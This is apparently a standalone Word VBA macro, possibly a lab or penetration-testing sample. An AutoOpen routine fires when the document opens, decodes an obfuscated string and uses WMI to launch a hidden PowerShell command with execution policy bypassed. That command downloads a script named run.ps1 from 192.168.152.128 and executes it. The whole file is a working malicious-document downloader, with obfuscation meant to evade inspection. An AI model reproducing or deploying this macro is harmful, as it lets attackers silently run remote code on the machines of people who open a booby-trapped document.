Function First(Length)
    First = Chr(Length - 17)
End Function

Function Second(Length)
    Second = Left(Length, 3)
End Function

Function Third(Length)
    Third = Right(Length, Len(Length) - 3)
End Function

Function Fourth(Length)
    Do
    res = res + First(Second(Length))
    Length = Third(Length)
    Loop While Len(Length) > 0
    Fourth = res
End Function

Function Invoke()

    Dim Content As String
    Dim Retriever As String
    
    If ActiveDocument.Name <> Fourth("131134127063117128116") Then
        Exit Function
    End If

    Content = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057127118136062128115123118116133049127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066070067063066067073064131134127063129132066056058"
    Retriever = Fourth(Content)
    
    GetObject(Fourth("136122127126120126133132075")).Get(Fourth("104122127068067112097131128116118132132")).Create Retriever, Null, Null, pid
End Function

Sub AutoOpen()
    Invoke
End Sub

